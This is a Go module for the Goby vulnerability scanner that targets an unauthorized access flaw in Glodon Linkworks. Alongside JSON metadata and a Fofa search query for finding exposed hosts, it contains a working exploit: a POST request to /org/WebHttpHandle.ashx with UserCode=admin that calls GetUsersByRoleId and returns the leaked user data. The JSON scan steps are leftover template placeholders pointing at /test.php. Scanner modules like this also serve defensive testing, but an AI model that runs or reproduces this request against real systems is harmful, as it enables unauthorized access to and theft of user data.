package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Glodon-Linkworks /org/WebHttpHandle Unauthorized Access Vulnerability",
    "Description": "<p>Glodon Technology Co., Ltd. is a listed software company, based on the field of construction engineering, focusing on the whole life cycle of engineering projects, providing professional applications in the field of construction engineering as the core basic support, and industrial big data, industrial credit, industrial finance and other value-added services. The company's business covers eight major sectors: engineering construction, engineering information, engineering cost, engineering education, e-government, e-commerce, Internet finance and investment</p>",
    "Product": "Glodon-LinWorks",
    "Homepage": "https://www.glodon.com/",
    "DisclosureDate": "2024-10-18",
    "PostTime": "2024-10-24",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"/Services/Identification/login.ashx\" && body=\"系统提示\"",
    "GobyQuery": "body=\"/Services/Identification/login.ashx\" && body=\"系统提示\"",
    "Level": "0",
    "Impact": "<p>1. Attackers can access and obtain sensitive data, such as user information and enterprise secrets. </p><p> 2. In some cases, an attacker may exploit the vulnerability to execute system commands to control the affected system.</p>",
    "Recommendation": "<p>Add user identity authentication mechanism or token verification to increase permission control over the function points of the system.</p>",
    "References": [
        "https://blog.csdn.net/weixin_43167326/article/details/143034756"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "3.4",
    "Translation": {
        "CN": {
            "Name": "广联达-Linkworks /org/WebHttpHandle 未授权访问漏洞",
            "Product": "广联达-LinWorks",
            "Description": "<p>广联达科技股份有限公司是一家上市软件公司，立足建设工程领域，围绕工程项目的全生命周期，提供以建设工程领域专业应用为核心基础支撑，以产业大数据、产业征信、产业金融等为增值服务。 公司业务涵盖工程施工、工程信息、工程造价、工程教育、电子政务、电子商务、互联网金融与投资八大板块<br></p>",
            "Recommendation": "<p>加入用户身份认证机制或token验证，对系统的功能点增加权限控制。<br></p>",
            "Impact": "<p>1.攻击者可以访问并获取敏感数据，如用户信息、企业机密等。&nbsp;</p><p>2.部分情况下，攻击者可能利用漏洞执行系统命令，控制受影响的系统。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Glodon-Linkworks /org/WebHttpHandle Unauthorized Access Vulnerability",
            "Product": "Glodon-LinWorks",
            "Description": "<p>Glodon Technology Co., Ltd. is a listed software company, based on the field of construction engineering, focusing on the whole life cycle of engineering projects, providing professional applications in the field of construction engineering as the core basic support, and industrial big data, industrial credit, industrial finance and other value-added services. The company's business covers eight major sectors: engineering construction, engineering information, engineering cost, engineering education, e-government, e-commerce, Internet finance and investment<br></p>",
            "Recommendation": "<p>Add user identity authentication mechanism or token verification to increase permission control over the function points of the system.<br></p>",
            "Impact": "<p>1. Attackers can access and obtain sensitive data, such as user information and enterprise secrets.&nbsp;</p><p>&nbsp;2. In some cases, an attacker may exploit the vulnerability to execute system commands to control the affected system.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9966"
}`

	postOrGet_4MOFgcJkvn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = `{"controller":"GTP.Org.Action.RoleCacheUserService","action":"GetUsersByRoleId","args":[1001]}`
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		header := map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Content-Type": "application/json; charset=utf-8",
			"Connection":   "close",
		}

		resp, err := setPostRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/org/WebHttpHandle"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/org/WebHttpHandle.ashx?FromNetCore=TRUE&UserID=0&UserCode=admin": "\"LastUpdateTime\"",
			}
			// 函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"default": {"/org/WebHttpHandle.ashx?FromNetCore=TRUE&UserID=0&UserCode=admin", "\"LastUpdateTime\""},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if _, ok := defaultModeMap[mode]; ok {
				fileUrl = defaultModeMap[mode][0]
				fileText = defaultModeMap[mode][1]
			} else {
				expResult.Success = false
				return expResult
			}
			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || !strings.Contains(resp, fileText) {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
